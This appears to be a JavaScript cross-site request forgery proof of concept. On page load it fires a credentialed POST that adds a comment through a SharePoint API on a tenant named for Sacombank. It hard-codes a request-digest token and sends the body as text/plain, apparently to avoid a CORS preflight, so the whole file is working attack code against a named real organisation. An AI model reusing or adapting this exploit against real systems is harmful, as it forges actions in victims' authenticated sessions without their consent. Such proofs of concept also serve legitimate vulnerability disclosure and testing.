(function(){
  const ACTION_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';
  const AUTO_RUN = true;

  function send() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', ACTION_URL, true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Content-Type', 'text/plain;charset=UTF-8');
    xhr.setRequestHeader('X-RequestDigest', "0x0BDD91D62E7EA154C258920BAB240FECAA08DE613CD8F824457BA460AA8C9B38A028CD6D31C2CAF73146C0E1C4F9CE5387A9023E78D6145567612A3D89345065,01 Oct 2025 08:16:20 -0000");
    xhr.onload = function() { console.log('POST status:', xhr.status, 'response:', xhr.responseText); };
    xhr.onerror = function() { console.error('Request error'); };
    var name = '{"text":"-----2-----","mentions":[]}';
    var body = name + '=';
    xhr.send(body);
  }

  if (AUTO_RUN) {
    setTimeout(()=> { try { send(); } catch(e) { console.error(e); } }, 50);
  } else {
    window.sendPoC = send;
  }
})();
